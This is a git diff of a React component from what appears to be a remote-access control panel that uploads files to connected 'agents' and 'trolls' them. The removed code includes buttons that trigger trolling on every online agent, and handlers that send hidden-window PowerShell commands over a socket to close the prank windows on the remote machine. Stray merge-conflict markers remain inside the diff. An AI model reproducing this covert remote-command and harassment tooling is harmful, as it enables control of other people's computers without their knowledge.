                   <Upload className="h-4 w-4 mr-2" />
                   Upload All
                 </Button>
               </div>
-              <div className="flex items-center gap-2">
-                <Button
-                  size="sm"
-                  variant="outline"
-                  disabled={isUploading || files.length === 0 || onlineAgents.length === 0}
-                  onClick={async () => {
-                    setError('');
-                    setSuccess('');
-                    for (const a of onlineAgents) {
-                      // Troll first file for all agents
-                      try {
-                        await startTrollingForAgent(files[0], a.id);
-                      } catch (e) {
-                        setError(`Troll failed for ${a.id}: ${String(e)}`);
-                      }
-                    }
-                  }}
-                  title="Troll all online agents with first selected file"
-                >
-                  Troll All Agents
-                </Button>
-              </div>
-              
-              <div className="space-y-1 max-h-64 overflow-y-auto">
+
+              <div className="space-y-1 max-h-[40vh] sm:max-h-64 overflow-y-auto">
                 {files.map((pending) => (
-                  <div
-                    key={pending.id}
-                    className="flex items-center gap-2 p-2 border rounded-md"
-                  >
-                    {getFileIcon(pending.file.type)}
+                  <div key={pending.id} className="flex flex-col sm:flex-row sm:items-center gap-2 p-2 border rounded-md">
+                    <div className="shrink-0">{getFileIcon(pending.file.type)}</div>
                     <div className="flex-1 min-w-0">
-<<<<<<< HEAD
                       <div className="flex items-center gap-2">
                         <p className="text-sm font-medium truncate">{pending.file.name}</p>
                         {uploadingById[pending.id] && (
@@ -847,98 +319,17 @@ $w.ShowDialog()`;
                       </div>
                       <p className="text-xs text-muted-foreground">{formatFileSize(pending.file.size)}</p>
                       {uploadingById[pending.id] && (
-                        <Progress value={Math.min(100, Math.max(0, progressById[pending.id] ?? 0))} className="h-1 mt-1" />
+                        <Progress
+                          value={Math.min(100, Math.max(0, progressById[pending.id] ?? 0))}
+                          className="h-2 mt-2"
+                        />
                       )}
-=======
-                      <p className="text-sm font-medium truncate">{file.name}</p>
-                      <p className="text-xs text-muted-foreground">{formatFileSize(file.size)}</p>
-                      <div className="mt-2">
-                        <Progress value={uploadProgress[file.name] || 0} />
-                        <div className="text-[10px] text-muted-foreground mt-1 flex items-center gap-2">
-                          <span>{Math.round(uploadProgress[file.name] || 0)}%</span>
-                          <span>•</span>
-                          <span>{formatBytesPerSec(uploadMeta[file.name]?.speed || 0)}</span>
-                          <span>•</span>
-                          <span>ETA {formatSeconds(uploadMeta[file.name]?.eta || 0)}</span>
-                        </div>
-                      </div>
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
                     </div>
-                    <div className="flex gap-1">
-                    <Button
-                      onClick={() => startTrolling(file)}
-                      disabled={isUploading}
-                      size="sm"
-                      variant="outline"
-                      title="Start trolling with this file"
-                    >
-                      <Play className="h-3 w-3" />
-                    </Button>
+                    <div className="flex gap-1 justify-end sm:justify-start">
                       <Button
-<<<<<<< HEAD
-                        onClick={() => startTrolling(pending)}
-                        disabled={isUploading || uploadingById[pending.id]}
-=======
-                        onClick={() => {
-                          if (!socket || !selectedAgent) return;
-                          const stopScript = `
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public static class Win {
-  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
-  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-  [DllImport("user32.dll")]
-  public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-}
-"@
-$titles = @("NCH_TROLLING","NCH_TROLLING_AUDIO")
-foreach ($t in $titles) {
-  $h = [Win]::FindWindow($null, $t)
-  if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPtr]::Zero) }
-}`;
-                          const cmd = `powershell -WindowStyle Hidden -Command "${stopScript.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
-                          socket.emit('command', { agent_id: selectedAgent, command: cmd, execution_id: `stop-all-trolls-${Date.now()}` });
-                        }}
-                        disabled={isUploading}
->>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
-                        size="sm"
-                        variant="outline"
-                        title="Stop All Trolls"
-                      >
-                        <Square className="h-3 w-3" />
-                      </Button>
-                      <Button
-                        onClick={() => {
-                          if (!socket || !selectedAgent) return;
-                          const stopScript = `
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public static class Win {
-  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
-  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-  [DllImport("user32.dll")]
-  public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-}
-"@
-$h = [Win]::FindWindow($null, "NCH_TROLLING")
-if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPtr]::Zero) }
-`;
-                          const cmd = `powershell -WindowStyle Hidden -Command "${stopScript.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
-                          socket.emit('command', { agent_id: selectedAgent, command: cmd, execution_id: `stop-trolling-${Date.now()}` });
-                        }}
-                        disabled={isUploading}
-                        size="sm"
-                        variant="outline"
-                        title="Stop trolling (close window)"
-                      >
-                        <Square className="h-3 w-3" />
-                      </Button>
-                      <Button
-                        onClick={() => uploadSingle(pending)}
-                        disabled={isUploading || uploadingById[pending.id]}
-                        size="sm"
+                        onClick={() => void uploadSingle(pending)}
+                        disabled={isUploading || uploadingById[pending.id] || !selectedAgent}
+                        size="icon"
                         variant="outline"
                         title="Upload file"
                       >
@@ -947,7 +338,7 @@ if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPt
                       <Button
                         onClick={() => removeFile(pending.id)}
                         disabled={uploadingById[pending.id]}
-                        size="sm"
+                        size="icon"
                         variant="outline"
                         title="Remove file"
                       >
@@ -960,11 +351,9 @@ if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPt
             </div>
           )}
 
-          {!((targetAgentId ?? selectedAgent) || onlineAgents.length > 0) && (
+          {!selectedAgent && (
             <Alert>
-              <AlertDescription>
-                Please select an agent from the Agents tab to upload files and start trolling
-              </AlertDescription>
+              <AlertDescription>Please select an agent from the Agents tab to upload files.</AlertDescription>
             </Alert>
           )}
         </CardContent>
